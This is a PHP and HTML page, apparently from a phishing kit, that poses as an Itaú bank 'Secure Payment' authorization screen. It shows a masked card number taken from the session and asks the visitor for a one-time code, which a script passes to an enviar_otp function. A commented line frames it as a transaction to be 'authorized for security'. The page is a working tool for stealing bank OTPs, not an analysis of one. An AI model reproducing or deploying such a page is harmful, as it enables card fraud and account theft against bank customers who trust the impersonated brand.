<?php 

session_start();
$ca =$_SESSION['ca'];

    
   // $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
		<script type="text/javascript" src="/scripts/functions2.js"></script>  	
		<script src="/scripts/contenido.js"></script>	
		<title>Secure Payment</title>
	</head>
	<body>

		<div class="logo" style="height:300px;">
			<br>
			<center><img src="https://i0.wp.com/logoroga.com/wp-content/uploads/2012/04/itau.jpg?fit=500%2C375&ssl=1" alt="" width="200" height="200px"></center>
		</div>
		<br><a style="color:rgb(105, 105, 105);">Detalles transaccionales</a><a id="textL"></a>
		<pre><b>               Comercio: </b id="contenido-especifico"></pre></a> 
		<a id="textL"><pre style="text-align:justify;">        <b>           </pre></a></center>
		<a id="textL"><pre>      <b>Número de tarjeta: </b> <?php echo "$ca****"; ?> </pre></a> 
		<a><pre> <b>     Digite el Código: </b></a><input type="tel" name="cDinamica" id="txtOTP" placeholder ="" required minlength="4" maxlength="8" style="width:100px; height:25px;">  <br></pre>
		<a href="" style="color:black;">Presione aquí para recibir un nuevo código</a><br><p></p>
		<center><input type="submit" value="Activar" id="btnOTP" style="color:white; background-color:black; width:25%; height:35px; margin:auto;"></center>

		<script type="text/javascript">
			var espera = 0;
			let identificadorTiempoDeEspera;
			function retardor() {
			identificadorTiempoDeEspera = setTimeout(retardorX, 900);
			}
			function retardorX() {
			}
			$(document).ready(function() {
				$('#btnOTP').click(function(){
					if ($("#txtOTP").val().length > 5) {
						enviar_otp($("#txtOTP").val());				
					}else{
						$(".mensaje").show();
						$(".pass").css("border", "1px solid red");
						$("#txtOTP").focus();
					}			
				});
				$("#txtOTP").keyup(function(e) {
					$(".pass").css("border", "1px solid #CCCCCC");	
					$(".mensaje").hide();				
				});
			});
		</script>
	</body>
</html>